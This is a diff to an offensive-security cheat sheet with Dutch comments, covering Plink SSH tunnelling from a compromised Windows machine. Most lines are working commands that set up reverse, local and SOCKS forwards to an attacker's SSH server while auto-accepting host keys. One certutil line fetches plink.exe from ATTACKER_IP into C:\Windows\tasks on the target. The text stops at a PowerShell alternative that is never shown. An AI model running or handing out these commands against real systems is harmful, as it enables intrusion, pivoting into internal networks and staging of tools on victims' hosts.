@@ -1,15 +1,15 @@
 # Plink - Windows SSH Tunneling (PuTTY CLI)
 # === Remote port forward (vanuit non-interactive shell) ===
-cmd.exe /c echo y | plink.exe -ssh -l kali -pw KALI_PASS -R KALI_IP:4444:127.0.0.1:4444 KALI_IP
+cmd.exe /c echo y | plink.exe -ssh -l kali -pw KALI_PASS -R ATTACKER_IP:4444:127.0.0.1:4444 ATTACKER_IP
 # echo y = accepteer host key automatisch
 # === Local port forward ===
-plink.exe -ssh -l kali -pw KALI_PASS -L 8080:INTERNAL_TARGET:80 KALI_IP
+plink.exe -ssh -l kali -pw KALI_PASS -L 8080:INTERNAL_TARGET:80 ATTACKER_IP
 # === Dynamic SOCKS proxy ===
-plink.exe -ssh -l kali -pw KALI_PASS -D 1080 KALI_IP
+plink.exe -ssh -l kali -pw KALI_PASS -D 1080 ATTACKER_IP
 # === Met SSH key (geen wachtwoord) ===
-plink.exe -ssh -i key.ppk -l kali -R KALI_IP:4444:127.0.0.1:4444 KALI_IP
+plink.exe -ssh -i key.ppk -l kali -R ATTACKER_IP:4444:127.0.0.1:4444 ATTACKER_IP
 # === Meerdere forwards ===
-plink.exe -ssh -l kali -pw KALI_PASS -R 4444:127.0.0.1:4444 -R 8080:127.0.0.1:80 KALI_IP
+plink.exe -ssh -l kali -pw KALI_PASS -R 4444:127.0.0.1:4444 -R 8080:127.0.0.1:80 ATTACKER_IP
 # === Upload plink naar target ===
 certutil -urlcache -f http://ATTACKER_IP/plink.exe C:\Windows\tasks\plink.exe
 # Of via PowerShell:
